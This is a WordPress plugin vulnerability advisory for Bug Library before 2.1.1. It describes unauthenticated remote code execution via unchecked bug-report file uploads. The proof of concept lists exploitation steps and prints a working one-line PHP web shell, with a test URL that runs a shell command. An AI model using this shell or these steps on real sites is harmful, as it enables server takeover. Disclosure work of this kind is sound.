## WordPress Plugin Vulnerabilities

# Bug Library < 2.1.1 - Unauthenticated RCE

### Description

The plugin does not check the file type on user-submitted bug reports, allowing an unauthenticated user to upload PHP files

### Proof of Concept

1. Configure the plugin to allow file attachments from "Bugs > General Options"
2. Add `[bug-library]` shortcode to a post
3. As an unauthenticated user, visit the page where the shortcode has been added
4. Upload a `.php` file (example below)
5. When directory listing is allowed, you can see the uploaded files
6. Confirm the shell at: https://wps-test.ddev.site/wp-content/uploads/bug-library/bugimage-671.php?cmd=ls%20-l
File used in test:
```
<?php echo system($\_GET['cmd']); ?>
```
Note: the filename will change based on the test site's configuration.
